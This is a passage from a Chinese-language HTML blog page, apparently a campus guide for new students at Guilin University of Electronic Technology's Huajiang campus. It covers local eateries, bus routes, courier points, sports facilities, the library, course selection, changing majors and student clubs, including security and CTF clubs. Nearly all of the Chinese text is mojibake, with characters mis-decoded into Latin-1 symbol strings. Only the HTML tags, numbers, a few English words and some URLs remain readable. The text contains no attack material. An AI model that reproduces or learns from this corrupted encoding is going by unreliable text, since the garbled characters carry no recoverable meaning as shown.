¡æ˜¯ä¸å¤ªæ”¯æŒå­¦ç”Ÿå»åè¡—åƒä¸œè¥¿çš„ï¼Œä¸»è¦æ˜¯å®‰å…¨é—®é¢˜ï¼Œæ‡‚å¾—éƒ½æ‡‚</p></blockquote><p>åè¡—ä¸»è¦æ˜¯èŠ±æ±Ÿæ‘æ°‘ä»¥åŠå¤–åœ°äººå¼€çš„ä¸€äº›é¤é¦†ï¼Œä»€ä¹ˆéƒ½æœ‰ï¼Œå¥¶èŒ¶åº—å±…å¤šï¼Œåè¡—çš„è¶…å¸‚ä»·æ ¼å¾ˆäº²æ°‘ï¼Œæ™šä¸Šåƒçƒ§çƒ¤æ’¸ä¸²ä¹Ÿæ˜¯åœ¨åè¡—çš„ç¾é£Ÿå¹¿åœºï¼Œæœ‰ä¸€åœˆçš„çƒ§çƒ¤åº—ï¼Œå°å‹èšé¤ã€å›¢å»ºä¹Ÿä¼šé€‰æ‹©å»åè¡—çš„åº—è§£å†³</p><p>å¥èº«æˆ¿ã€é…’åº—ã€ç½‘å§ã€ktvã€å°çƒå®¤å’Œéº»å°†å®¤åè¡—ä¹Ÿæœ‰ï¼Œå¤šçš„ä¸è¯´äº†</p><h3 id="æ ¡é—¨å£-amp-å¤–å–"><a href="#æ ¡é—¨å£-amp-å¤–å–" class="headerlink" title="æ ¡é—¨å£&amp;å¤–å–"></a>æ ¡é—¨å£&amp;å¤–å–</h3><p>æ ¡é—¨å£çš„é¤é¦†ä¸€èˆ¬æ˜¯åšå¤–å–ï¼Œä¹Ÿæ˜¯ä»€ä¹ˆéƒ½æœ‰å§ï¼Œç¾å›¢é¥¿äº†ä¹ˆçœ‹çœ‹å°±çŸ¥é“äº†ã€‚æ ¡é—¨å£æœ‰äº›å¤§ä¸€ç‚¹çš„é¥­åº—ï¼Œä¸€èˆ¬ç”¨äºå¤§å‹çš„å›¢å»ºã€èšé¤</p><h3 id="å•†ä¸šè¡—"><a href="#å•†ä¸šè¡—" class="headerlink" title="å•†ä¸šè¡—"></a>å•†ä¸šè¡—</h3><p>å•†ä¸šè¡—ä¸»è¦æ˜¯å‡ ä¸ªå°è¶…å¸‚ï¼Œå‡ å®¶æ°´æœåº—ï¼Œä¸¤å®¶é¢åŒ…åº—ï¼Œä¸‰ä¸ªè¿è¥å•†ã€å‡ å®¶å¥¶èŒ¶åº—ã€ä¸€ä¸ªè£ç¼é“ºã€ä¸‰ä¸ªæ–‡å…·åº—ï¼Œä»·æ ¼å°±æ˜¯å¸‚åœºä»·</p><h2 id="äº¤é€š-amp-å¿«é€’"><a href="#äº¤é€š-amp-å¿«é€’" class="headerlink" title="äº¤é€š&amp;å¿«é€’"></a>äº¤é€š&amp;å¿«é€’</h2><h3 id="å‡ºæ ¡"><a href="#å‡ºæ ¡" class="headerlink" title="å‡ºæ ¡"></a>å‡ºæ ¡</h3><p>å­¦æ ¡å‡ºå±±ä¸€å…±ä¸¤ç§å…¬äº¤è½¦ï¼Œåˆ†åˆ«æ˜¯ <strong>13è·¯æ¡‚ç”µä¸“çº¿</strong> è·Ÿ<strong>116è·¯</strong>ï¼Œ13 è·¯åŒºé—´ä¸ºèŠ±æ±Ÿæ ¡åŒºé—¨å£â€”â€”é‡‘é¸¡å²­æ ¡åŒºé—¨å£ï¼Œ116 è·¯åŒºé—´ä¸ºèŠ±æ±Ÿæ ¡åŒºé—¨å£â€”â€”å…«é‡Œè¡—è½¦åœºï¼ˆé€”å¾„æ¡‚æ—åŒ—ç«™ï¼‰</p><blockquote><p>è¦å»æ¡‚æ—ä»€ä¹ˆæ™¯ç‚¹ç©æˆ–è€…å»å…¶ä»–åœ°æ–¹ç›´æ¥ç”¨åœ°å›¾è½¯ä»¶æœï¼Œæœ‰è¯¦ç»†çš„å…¬äº¤è½¦è·¯çº¿æ–¹æ¡ˆï¼Œä½†æ˜¯ç»•ä¸å¼€çš„å°±æ˜¯å‡ºå±±çš„ 13 è·¯å’Œ 116 è·¯</p></blockquote><h3 id="æ ¡å†…"><a href="#æ ¡å†…" class="headerlink" title="æ ¡å†…"></a>æ ¡å†…</h3><p>æ ¡å†…äº¤é€šåˆ†ä¸ºè‡ªè´­ç”µåŠ¨è½¦ã€è‡ªè´­è‡ªè¡Œè½¦ã€å…±äº«ç”µåŠ¨è½¦ã€å…±äº«è‡ªè¡Œè½¦ã€æ ¡å›­å°å·´å£«ã€æ­¥è¡ŒğŸš¶â€ï¼Œä¸€å…±å…­ç§è§£å†³æ–¹æ¡ˆ</p><blockquote><p>å…¶ä¸­ä¸å»ºè®®è¿›æ ¡ç›´æ¥è´­ä¹°ç”µåŠ¨è½¦ï¼Œç¬¬ä¸€æ˜¯ç‰Œç…§é—®é¢˜ï¼Œç¬¬äºŒæ˜¯æ”¿ç­–é—®é¢˜ï¼Œå­¦æ ¡å¯èƒ½ä¹‹åä¼šå‘å¸ƒç›¸å…³çš„æ”¿ç­–é™åˆ¶è‡ªè´­ç”µåŠ¨è½¦ï¼Œå› ä¸ºå­¦æ ¡é‡Œé¢å®åœ¨æ˜¯å¤ªå¤šå¤ªå¤šå¤ªå¤šç”µåŠ¨è½¦äº†ï¼Œç”šè‡³å·²ç»å½±å“åˆ°æ—¥å¸¸äº¤é€šäº†</p></blockquote><h3 id="å¿«é€’"><a href="#å¿«é€’" class="headerlink" title="å¿«é€’"></a>å¿«é€’</h3><blockquote><p><strong>å¿«é€’åœ°å€ï¼šå¹¿è¥¿å£®æ—è‡ªæ²»åŒºæ¡‚æ—å¸‚çµå·å¿æ¡‚æ—ç”µå­ç§‘æŠ€å¤§å­¦èŠ±æ±Ÿæ ¡åŒº</strong></p></blockquote><p>ä»»ä½•å¿«é€’åˆ°äº†éƒ½ä¼šç»™ä½ å‘çŸ­ä¿¡ï¼Œéšä¾¿æ‰¾æ‰¾å°±èƒ½æ‰¾åˆ°</p><p>ä¸€å…±ä¸¤ä¸ªèœé¸Ÿé©¿ç«™ï¼Œä¸€ä¸ªåœ¨åè¡—ä¸€ä¸ªåœ¨æ€¡å›­é¤å…æ—è¾¹ï¼Œapp å¯ä»¥æŸ¥åˆ°</p><p>äº¬ä¸œè·Ÿé‚®æ”¿åœ¨æ€¡å›­é¤å…çš„èœé¸Ÿé©¿ç«™æ—è¾¹</p><p>é¡ºä¸°è·Ÿç™¾ä¸–åœ¨è¿›åè¡—å³è½¬ 200 ç±³å¤„</p><p>éŸµè¾¾åœ¨è¿›åè¡—å·¦è½¬çš„ç¾é£Ÿå¹¿åœºé‡Œï¼Œæœ‰è·¯æ ‡</p><p>æ‹¼å¤šå¤šä¹°çš„ä¸œè¥¿å¯„çš„æå…”ã€ç†ŠçŒ«ç­‰ç­‰å°ç‰Œå­å¿«é€’åœ¨åè¡—ç”µå½±é™¢æ¥¼ä¸‹</p><h2 id="é”»ç‚¼èº«ä½“"><a href="#é”»ç‚¼èº«ä½“" class="headerlink" title="é”»ç‚¼èº«ä½“"></a>é”»ç‚¼èº«ä½“</h2><p>å­¦æ ¡æœ‰ä¸€ä¸ªç”°å¾„åœºï¼Œç”°å¾„åœºæ—è¾¹æ˜¯ä¸€ç‰‡ç¯®çƒåœºï¼Œç¯®çƒåœºæ—è¾¹æœ‰å‡ ä¸ªä¹’ä¹“çƒå°ï¼Œç”°å¾„åœºæ—è¾¹æœ‰å‡ ä¸ªæ’çƒåœº</p><p>å®è®­ä¸­å¿ƒæ—è¾¹æœ‰ä¸€ä¸ªæ¸¸æ³³é¦†ï¼Œæ¸¸æ³³é¦†æ—è¾¹æœ‰ä¸€ç‰‡ç½‘çƒåœº</p><p>çƒç±»é¦†é‡Œé¢æœ‰ä¸¤ä¸ªç¯®çƒåœºï¼Œå¾ˆå¤šä¸ªä¹’ä¹“çƒæ¡Œï¼Œå¾ˆå¤šä¸ªç¾½æ¯›çƒåœºï¼Œä¸€ä¸ªå°å‹å¥èº«æˆ¿ï¼Œçƒç±»é¦†å»å¾€ D åŒºå°é“è·¯ä¸Šæœ‰ä¸€ç‰‡ç½‘çƒåœº</p><p>å½©è™¹å¤§é“æ—è¾¹æœ‰ä¸€ä¸ªè¶³çƒåœºä½†ä¸æ˜¯æ ‡å‡†åœºï¼Œè¶³çƒåœºæ—è¾¹æœ‰ä¸€ç‰‡ç¯®çƒåœº</p><h1 id="å­¦ä¹ ç¯‡"><a href="#å­¦ä¹ ç¯‡" class="headerlink" title="å­¦ä¹ ç¯‡"></a>å­¦ä¹ ç¯‡</h1><h2 id="å›¾ä¹¦é¦†"><a href="#å›¾ä¹¦é¦†" class="headerlink" title="å›¾ä¹¦é¦†"></a>å›¾ä¹¦é¦†</h2><p>åå—æœ€å¤§çš„å›¾ä¹¦é¦†ä¹‹ä¸€ï¼Œéå‡æœŸæ™šä¸Šåç‚¹åŠå·¦å³é—­é¦†ï¼Œæ—©ä¸Šå¼€é—¨è‚¯å®šåœ¨ä½ èµ·åºŠä¹‹å‰ï¼Œå†…æœ‰å’–å•¡å…å’Œä¼šè®®å®¤ï¼Œç¯å¢ƒå†¬æš–å¤å‡‰ ç©ºè°ƒå…¨å¤©å€™å¼€æ”¾ï¼Œé¢†å¯¼è¯´å›¾ä¹¦é¦†å¼€ä¸€å¤©ç©ºè°ƒè´¹ç”¨ä¸Šä¸‡</p><p>å…¥å­¦åå‡ å¤©æœ‰å›¾ä¹¦é¦†è€ƒè¯•ï¼Œè€ƒè¯•é€šè¿‡å¯ä»¥ç”¨ä¸€å¡é€šå…¥é¦†ã€å€Ÿä¹¦</p><p>é¦†å†…æœ‰æŸ¥å›¾ä¹¦çš„ç”µè„‘ï¼Œå€Ÿä¹¦æµç¨‹ä¸€èˆ¬æ˜¯åœ¨ç”µè„‘ä¸ŠæŸ¥æ‰¾æœ‰æ²¡æœ‰ä½ è¦çš„ä¹¦ï¼Œç„¶åçœ‹å›¾ä¹¦çš„å®šä½åœ¨å“ªï¼Œæ‹¿ä¹¦ï¼Œåˆ·å¡å€Ÿä¹¦ï¼Œä¸€æ°”å‘µæˆ</p><h2 id="é€‰è¯¾-amp-ä¹°ä¹¦-amp-ä¸Šè¯¾-amp-è€ƒè¯•"><a href="#é€‰è¯¾-amp-ä¹°ä¹¦-amp-ä¸Šè¯¾-amp-è€ƒè¯•" class="headerlink" title="é€‰è¯¾&amp;ä¹°ä¹¦&amp;ä¸Šè¯¾&amp;è€ƒè¯•"></a>é€‰è¯¾&amp;ä¹°ä¹¦&amp;ä¸Šè¯¾&amp;è€ƒè¯•</h2><p>å¤§ä¸€ä¸Šä¸ç”¨é€‰è¯¾ä¹Ÿä¸ç”¨ä¹°ä¹¦ï¼Œä¸Šè¯¾éƒ½æ˜¯è·ŸåŒç­ã€éš”å£ç­åŒå­¦ä¸€èµ·ä¸Šï¼Œè¾…å¯¼å‘˜ä¼šå¸®ä½ å®‰æ’å¥½ï¼Œå¤§ä¸€ä¸‹å¼€å§‹åœ¨æ•™åŠ¡ç³»ç»Ÿè‡ªç”±é€‰è¯¾ï¼Œä¹°ä¹¦ä¹Ÿæœ‰å®˜æ–¹çš„å¹³å°ï¼Œä¹°çš„æ˜¯æ–°ä¹¦ï¼Œä½†æ˜¯æ¨èå»æ‰¾å­¦é•¿å­¦å§æˆ–è€…äºŒæ‰‹ä¹¦åº—æ”¶æ—§ä¹¦ã€‚</p><p>è¯¾è¡¨ä¸Šæ•™å®¤çš„æ ¼å¼ä¸€èˆ¬éƒ½æ˜¯<strong>æ•™å­¦æ¥¼å· + æ•™å®¤å·</strong>ï¼Œæ¯”å¦‚ï¼š<strong>17204</strong> å°±è¡¨ç¤ºåœ¨<strong>ç¬¬åä¸ƒæ•™å­¦æ¥¼çš„ 204 å·æ•™å®¤</strong>ï¼Œç°åœ¨æœ‰ç©ºè°ƒçš„æ•™å­¦æ¥¼æ˜¯åå…­æ•™è¿˜æœ‰ä¸€æ•™é«˜æ¥¼ï¼Œå…¶ä»–æ•™å®¤å‡æœ‰å¤§ç”µé£æ‰‡</p><p><strong>è€ƒè¯•ä¸å†æœ‰æœŸæœ«è€ƒè¯•çš„æ¦‚å¿µï¼Œéƒ½å«åšç»“è¯¾è€ƒè¯•</strong>ï¼Œå¤§å­¦ä¸Šè¯¾æœ‰å¹³æ—¶åˆ†å æ¯”ï¼Œä¸æ˜¯æœ€åè€ƒè¯•å¤šå°‘åˆ†æœ€åæ€»è¯„å°±æ˜¯å¤šå°‘åˆ†ï¼Œ<strong>å¹³æ—¶åˆ†å¤§éƒ¨åˆ†ç”±åˆ°è¯¾ç‡ã€ä½œä¸šå®Œæˆæƒ…å†µå’Œè€å¸ˆå°è±¡ç»„æˆ</strong>ï¼Œæœ‰äº›è¯¾ä¼šæœ‰ä¸­å›½æ…•è¯¾ä¸Šçš„ç½‘è¯¾ï¼Œè¿™ä¹Ÿæ˜¯ç®—åœ¨å¹³æ—¶åˆ†é‡Œé¢ï¼Œ<strong>ä¸æ˜¯æ‰€æœ‰è¯¾ç¨‹ç»“è¯¾éƒ½æ˜¯åœ¨å­¦æœŸæœŸæœ«</strong>ï¼Œå¯èƒ½æœ‰äº›è¯¾ä¸Šå…«å‘¨ï¼Œæœ‰äº›ä¸Šåå‘¨ï¼Œæœ‰äº›ä¸Šåå…­å‘¨ï¼Œä¸€èˆ¬ç»“è¯¾è€ƒè¯•å®‰æ’åœ¨ç»“è¯¾åä¸¤å‘¨ï¼Œ<strong>å¸Œæœ›å¤§å®¶ä¸è¦æŒ‚ç§‘å¥½å¥½å­¦ä¹ </strong></p><blockquote><p><strong>å¸Œæœ›å¤§å®¶éƒ½å¥½å¥½ä¸Šè¯¾ï¼Œå¦‚æœä½ è¦ç¿˜è¯¾ï¼Œè¡¡é‡ä¸€ä¸‹ç¿˜è¯¾ä¹‹åä½ è¦å¹²çš„äº‹æƒ…å’Œä¸Šè¯¾çš„é‡è¦æ€§ï¼Œåšå‡ºä¸è®©è‡ªå·±åæ‚”çš„é€‰æ‹©</strong></p><p><strong>é€‰è¯¾é€‰å“ªä¸ªè€å¸ˆè¿™ä¸ªé—®é¢˜å¯ä»¥é—®ä¸€ä¸‹å­¦é•¿å­¦å§ï¼Œé€‰ä¸ªæ¯”è¾ƒå¥½çš„è€å¸ˆæ¯”è¾ƒæ–¹ä¾¿ï¼Œå­¦å¾—å¥½ä¼šç»™ä½ æ¯”è¾ƒé«˜çš„åˆ†ï¼Œå­¦å¾—ä¸å¥½è€å¸ˆä¹Ÿä¼šæ‹¼å‘½å»æä½ çš„é‚£ç§</strong></p></blockquote><h2 id="è½¬ä¸“ä¸š"><a href="#è½¬ä¸“ä¸š" class="headerlink" title="è½¬ä¸“ä¸š"></a>è½¬ä¸“ä¸š</h2><p>è½¬ä¸“ä¸šæœ€å¸¸è§ä¸¤ç§ï¼Œç¬¬ä¸€æ˜¯å­¦ä¸šä¼˜ç§€å­¦ç”Ÿè½¬ä¸“ä¸šï¼Œç¬¬äºŒæ˜¯ç‰¹é•¿ç”Ÿè½¬ä¸“ä¸š</p><ul><li>20 çº§å­¦ä¸šä¼˜ç§€è½¬ä¸“ä¸šçš„è¦æ±‚æ˜¯å­¦åˆ†ç»©åœ¨å¹´çº§æ’åå‰ 30%ï¼Œä¸”å¯¹é«˜æ•°æˆç»©æœ‰è¦æ±‚</li><li>20 çº§ç‰¹é•¿ç”Ÿè½¬ä¸“ä¸šçš„è¦æ±‚æ˜¯è·å¾—è¿‡è·Ÿæƒ³è¦å»çš„é‚£ä¸ªä¸“ä¸šç›¸å…³çš„ï¼Œçœéƒ¨çº§äºŒç­‰å¥–ä»¥ä¸Šçš„å¥–ï¼Œ<strong>æˆ–è€…</strong>æ˜¯æœ‰æ˜ç¡®èƒ½å¤Ÿè¯æ˜ä½ å¯¹é‚£ä¸ªä¸“ä¸šæœ‰ç‰¹é•¿çš„ææ–™</li></ul><p>æ¯å¹´è½¬ä¸“ä¸šçš„æ”¿ç­–éƒ½åœ¨å˜ï¼Œè¿›å­¦æ ¡ä»¥åå¯ä»¥å»æœ¬ç§‘æ•™è‚²æœåŠ¡ç½‘æ‰¾è½¬ä¸“ä¸šçš„ç›¸å…³èµ„æ–™ï¼Œéœ€è¦è¿æ¥æ ¡å›­ç½‘æ‰èƒ½è¿›ï¼Œ<a href="http://utsc.guet.edu.cn/">ç½‘å€ç‚¹è¿™é‡Œ</a></p><h1 id="ç¤¾å›¢ç¯‡"><a href="#ç¤¾å›¢ç¯‡" class="headerlink" title="ç¤¾å›¢ç¯‡"></a>ç¤¾å›¢ç¯‡</h1><blockquote><p>ç¤¾å›¢æ’åä¸åˆ†å…ˆåï¼Œéƒ½æ˜¯å¥½ç©çš„</p><blockquote><p>2021.08.02</p><p>æœ‰å¾ˆå¤šç¤¾å›¢çš„ç®€ä»‹è¿˜æ²¡å†™ä¸Šæ¥ï¼Œä¸‰é™¢æ˜¯æœ‰å¾ˆå¤šç¤¾å›¢çš„ï¼Œåé¢ä¹Ÿä¼šæ…¢æ…¢æ›´æ–°</p></blockquote></blockquote><h2 id="ç”Ÿæ´»ç±»ç¤¾å›¢"><a href="#ç”Ÿæ´»ç±»ç¤¾å›¢" class="headerlink" title="ç”Ÿæ´»ç±»ç¤¾å›¢"></a>ç”Ÿæ´»ç±»ç¤¾å›¢</h2><h3 id="N-D-C-æ ¸èˆå™¨"><a href="#N-D-C-æ ¸èˆå™¨" class="headerlink" title="N.D.C æ ¸èˆå™¨"></a>N.D.C æ ¸èˆå™¨</h3><p>N.D.C æ ¸èˆå™¨æ˜¯è®¡ç®—æœºä¸ä¿¡æ¯å®‰å…¨å­¦é™¢æ ¡å›¢å§”ç®¡ç†ä¸‹çš„ä¸€æ”¯é™¢çº§é˜Ÿä¼ï¼Œåœ¨å­¦é™¢çš„æ”¯æŒä¸å¸®åŠ©ä¸‹ï¼Œå–å¾—äº†ä¸å°‘è¿›æ­¥ä¸å‘å±•ï¼Œæˆ‘ä»¬æ¯ä¸€ä½æˆå‘˜éƒ½èƒ½æ¸…æ™°åœ°è®¤è¯†èˆè¹ˆé˜Ÿçš„èŒè´£ï¼šç§¯æå‚åŠ å­¦é™¢ç»„ç»‡çš„å„ç±»æ´»åŠ¨æ¼”å‡ºï¼Œä»£è¡¨å­¦é™¢å‚åŠ æ ¡çº§èˆè¹ˆå¤§èµ›ã€å¿«é—ªæ¯”èµ›ï¼Œåœ¨èˆå°ä¸Šå±•ç°è‡ªæˆ‘ï¼Œå±•ç°å‡ºå¯¹èˆè¹ˆçš„çƒ­çˆ±å’Œè¿½æ±‚ï¼Œæˆ‘ä»¬è¿˜ä¼šä¸é—´æ–­å‚ä¸å„å­¦é™¢é˜Ÿä¼ä¹‹é—´çš„äº¤æµã€‚</p><p>æˆ‘ä»¬èˆè¹ˆé˜Ÿä»¥åŸ¹å…»åŸºç¡€ä¸ºä¸»ï¼Œè®©å¤§å®¶ä¸æ–­æå‡è‡ªå·±ï¼Œåœ¨é˜Ÿå†…å¤§å®¶å¯ä»¥è·Ÿå­¦é•¿å­¦å§å­¦ä¹ èˆè¹ˆï¼Œä¹Ÿå¯ä»¥æ ¹æ®è‡ªå·±çš„å…´è¶£è‡ªå­¦èˆè¹ˆï¼Œ<strong>é˜Ÿå†…ä¼šå®šæœŸä¸¾è¡Œè€ƒæ ¸</strong>ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼ï¼Œç£ä¿ƒå¤§å®¶ï¼Œæé«˜ç»ƒèˆçš„ç§¯ææ€§ï¼Œå¹¶ä¿ƒè¿›é˜Ÿå†…çš„äº¤æµï¼Œæœ‰åˆ©äºæé«˜æ•´ä½“æ°´å¹³ï¼Œè®©å¤§å®¶éƒ½èƒ½ä¿æŒä¸€ä¸ªè‰¯å¥½çš„èº«ä½“åè°ƒæ€§ã€‚</p><blockquote><p>æ‹›æ–°ç¾¤å·ï¼š444135141</p></blockquote><h2 id="ç§‘æŠ€ç±»ç¤¾å›¢"><a href="#ç§‘æŠ€ç±»ç¤¾å›¢" class="headerlink" title="ç§‘æŠ€ç±»ç¤¾å›¢"></a>ç§‘æŠ€ç±»ç¤¾å›¢</h2><h3 id="å¤§å­¦ç”Ÿç§‘æŠ€åä¼šï¼ˆç§‘åï¼‰"><a href="#å¤§å­¦ç”Ÿç§‘æŠ€åä¼šï¼ˆç§‘åï¼‰" class="headerlink" title="å¤§å­¦ç”Ÿç§‘æŠ€åä¼šï¼ˆç§‘åï¼‰"></a>å¤§å­¦ç”Ÿç§‘æŠ€åä¼šï¼ˆç§‘åï¼‰</h3><p>ä¸‰é™¢ç§‘åæ˜¯ä¾æ‰˜äºè®¡ç®—æœºä¸ä¿¡æ¯å®‰å…¨å­¦é™¢ï¼Œé¢å‘å…¨æ ¡çš„æ ¡çº§æŠ€æœ¯ç¤¾å›¢ã€‚æˆ‘ä»¬çš„æ´»åŠ¨åŒ…æ‹¬æŠ€æœ¯å­¦ä¹ ï¼Œæ‰¿åŠå’Œç­–åˆ’å„ç±»ç§‘æŠ€èµ›äº‹å’Œé¢å¥–ä»ªå¼ï¼Œç»„ç»‡åˆ›æ–°åˆ›ä¸šè®­ç»ƒç­‰ã€‚ç§‘åè®¾æœ‰è½¯ä»¶éƒ¨ã€ç¡¬ä»¶éƒ¨ã€å¤šåª’ä½“éƒ¨ã€ç»„ç»‡éƒ¨å››ä¸ªéƒ¨é—¨ï¼Œè‡´åŠ›äºå¯¹æˆå‘˜æŠ€æœ¯èƒ½åŠ›ä»¥åŠåˆ›æ–°èƒ½åŠ›çš„åŸ¹å…»ã€‚</p><p>åœ¨ç§‘åï¼Œä½ ä¸ä»…èƒ½æé«˜è‡ªèº«çš„æŠ€æœ¯ï¼Œç»“äº¤å¿—åŒé“åˆçš„æœ‹å‹ï¼Œè¿˜èƒ½æ”¶è·å‰è¾ˆçš„æ‚‰å¿ƒæŒ‡å¯¼ï¼Œå…±äº«ä¼˜è´¨çš„èµ„æºæœåŠ¡ã€‚</p><p>ç§‘åçš„å¤§é—¨å°†ä¸ºä½ ä»¬æ•å¼€ï¼Œæˆ‘ä»¬æœŸå¾…ä½ ä»¬çš„åˆ°æ¥ï¼Œæ¬¢è¿ä¸æˆ‘ä»¬ä¸€èµ·ç•…æ¸¸åœ¨æŠ€æœ¯çš„æµ·æ´‹ï¼</p><blockquote><p>æ‹›æ–°ç¾¤å·ï¼š860651675</p><p>æ‹›æ–°ç½‘å€ï¼š<a href="https://hello.kexie.space/">https://hello.kexie.space/</a></p></blockquote><h3 id="ä¿¡æ¯å®‰å…¨åä¼š"><a href="#ä¿¡æ¯å®‰å…¨åä¼š" class="headerlink" title="ä¿¡æ¯å®‰å…¨åä¼š"></a>ä¿¡æ¯å®‰å…¨åä¼š</h3><p>æ¡‚ç”µä¿¡æ¯å®‰å…¨åä¼š GUETSEC éš¶å±äºæ¡‚ç”µç½‘ç»œä¿¡æ¯ä¸­å¿ƒï¼Œæœ€åˆäº 2013 å¹´ç”±å‡ åç½‘ç»œå®‰å…¨çˆ±å¥½è€…ç»„æˆï¼Œæ˜¯ä¸€ä¸ªå¤§å‹è·¨æ ¡åŒºç¤¾å›¢ã€‚æˆ‘ä»¬ä¸“æ³¨äº web å®‰å…¨ã€äºŒè¿›åˆ¶å®‰å…¨ã€é€†å‘ç ´è§£ã€å¯†ç å­¦å’ŒåŒºå—é“¾ç­‰æ–¹å‘çš„ç ”ç©¶ã€‚</p><p>æˆ‘ä»¬ä¸å¼ºæ±‚æ¯ä½æˆå‘˜çš„å­¦ä¹ æ–¹å‘ï¼Œè´¯å½»è‡ªç”±ã€å¹³ç­‰ã€å…±äº«çš„ç²¾ç¥ï¼Œæˆ‘ä»¬å¸¸ç»„é˜Ÿå‚åŠ å„å¤§å®‰å…¨èµ›äº‹ä¸”å–å¾—äº†ä¸é”™çš„æˆç»©ï¼Œåœ¨å¹¿è¥¿é«˜æ ¡ä¸­ä¸€ç›´æ˜¯æ•°ä¸€æ•°äºŒçš„ï¼Œä½†æ˜¯åœ¨å…¨å›½æ¥çœ‹å¹¶ä¸ç†æƒ³ï¼Œå•ä¸å…¶ä»–ä¸‰æ‰€ç”µå­ç§‘æŠ€å¤§å­¦ç›¸æ¯”ï¼Œå·®è·å°±å¾ˆå¤§ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€ç›´åœ¨åŠªåŠ›å‘å…¨å›½çš„å®‰å…¨å¼ºæ ¡çœ‹é½ï¼Œæ‹‰è¿‘è·ç¦»ã€‚</p><p>æˆ‘ä»¬éœ€è¦æ¯ä¸€æ‰¹æ–°é²œè¡€æ¶²å…±åŒåŠªåŠ›ï¼Œä¸€èµ·å»ºè®¾æˆ‘æ ¡çš„ä¿¡å®‰å’Œç½‘å®‰ä¸“ä¸šï¼Œéå¸¸æ¬¢è¿å¿—åŒé“åˆçš„æœ‹å‹åŠ å…¥æˆ‘ä»¬çš„å›¢é˜Ÿï¼</p><blockquote><p>æ‹›æ–°ç¾¤å·ï¼š852371638</p><p>å®˜æ–¹ CTF åšé¢˜å¹³å°ï¼š<a href="http://82.156.18.42/">http://82.156.18.42/</a></p></blockquote><h3 id="ä¸ƒæ˜Ÿç“¢è™«å·¥ä½œåŠ"><a href="#ä¸ƒæ˜Ÿç“¢è™«å·¥ä½œåŠ" class="headerlink" title="ä¸ƒæ˜Ÿç“¢è™«å·¥ä½œåŠ"></a>ä¸ƒæ˜Ÿç“¢è™«å·¥ä½œåŠ</h3><p>ä¸ƒæ˜Ÿç“¢è™«å·¥ä½œåŠæˆç«‹äº 2014 å¹´ï¼Œæ˜¯ä¸»æ”»ä¿¡æ¯å®‰å…¨æ–¹å‘çš„ä¸€ä¸ªç§‘æŠ€ç±»ç¤¾å›¢ï¼Œç›®å‰ä¸»è¦çš„ç ”ç©¶æ–¹å‘æœ‰ web å®‰å…¨ï¼Œé€†å‘åˆ†æï¼ŒäºŒè¿›åˆ¶å®‰å…¨ç­‰ç­‰ã€‚æˆ‘ä»¬å’Œå¤šå®¶å®‰å…¨å…¬å¸æœ‰ç€é•¿æœŸåˆä½œå…³ç³»ï¼Œåœ¨è¿™é‡Œä½ å¯ä»¥æ›´æ—©äº†è§£åˆ°å…¬å¸çš„éœ€æ±‚ï¼Œä»¥ä¾¿æ˜ç¡®è‡ªå·±çš„å­¦ä¹ æ–¹å‘ã€‚</p><p>å½“ç„¶ï¼Œåœ¨ç“¢è™«çš„å¤§å®¶åº­é‡Œï¼Œä½ ä¸ä»…å¯ä»¥ä¸è®¸å¤šå¤§ä½¬äº’ç›¸äº¤æµï¼Œä¸æ–­çš„å­¦ä¹ æŠ€æœ¯ï¼Œæå‡è‡ªå·±çš„å®åŠ›ï¼Œè¿˜å¯ä»¥äº¤åˆ°è®¸å¤šå¿—åŒé“åˆçš„æœ‹å‹ã€‚åœ¨ç“¢è™«é‡Œç›¸äº’ç£ä¿ƒï¼Œäº’ç›¸å¸®åŠ©ï¼Œå…±åŒåˆ†äº«å­¦ä¹ ç»éªŒï¼Œä¸€åŒæ„Ÿå—äº¤æµäº§ç”Ÿçš„ç«èŠ±å§ï¼</p><p>Action speak louder than words ! è¡ŒåŠ¨èƒœäºè¨€è¯­ï¼æˆ‘ä»¬æ¸´æœ›çœŸæ­£çƒ­çˆ±ä¿¡æ¯å®‰å…¨äº‹ä¸šï¼Œæœ‰å¼ºçƒˆè¿›å–å¿ƒï¼Œå¼ºçƒˆå¥½å¥‡å¿ƒï¼Œè¶…å¼ºåŠ¨æ‰‹èƒ½åŠ›ï¼Œå…·æœ‰åˆ†äº«ç²¾ç¥çš„å°ä¼™ä¼´ï¼ŒåŠ å…¥æˆ‘ä»¬ï¼Œä¸€åŒå»ºè®¾ç“¢è™«å¤§å®¶åº­ã€‚æˆ‘ç›¸ä¿¡ï¼Œåªè¦ä½ è‚¯åŠªåŠ›å¹¶åšå‡ºè¡ŒåŠ¨ï¼Œæœªæ¥å°±ä¸€å®šæ˜¯å±äºä½ çš„ï¼</p><blockquote><p>æ‹›æ–°ç¾¤å·ï¼š935761165</p></blockquote><h3 id="ä¿¡æ¯å®‰å…¨ç»´æŠ¤å°ç»„"><a href="#ä¿¡æ¯å®‰å…¨ç»´æŠ¤å°ç»„" class="headerlink" title="ä¿¡æ¯å®‰å…¨ç»´æŠ¤å°ç»„"></a>ä¿¡æ¯å®‰å…¨ç»´æŠ¤å°ç»„</h3><p>ä¸‰é™¢ä¿¡æ¯å®‰å…¨ç»´æŠ¤å°ç»„æˆç«‹äº2008å¹´3æœˆï¼Œæ˜¯ä¸€ä¸ªåœ¨å­¦é™¢å›¢å§”æŒ‡å¯¼ä¸‹çš„ç§‘æŠ€å‹é™¢çº§ç¤¾å›¢ï¼Œè‡´åŠ›äºä¸ºå…¨æ ¡åŒå­¦æä¾›å­¦ä¹ ã€äº¤æµã€ç ”ç©¶ä¿¡æ¯å®‰å…¨ã€å®‰å…¨ç¼–ç¨‹ã€å¤§æ•°æ®åˆ†æä¸æŒ–æ˜ã€åç«¯å¼€å‘ç­‰æ–¹å‘çš„ç»¼åˆå¹³å°ã€‚æˆ‘ä»¬æœ¬ç€ä»¥å­¦ä¹ 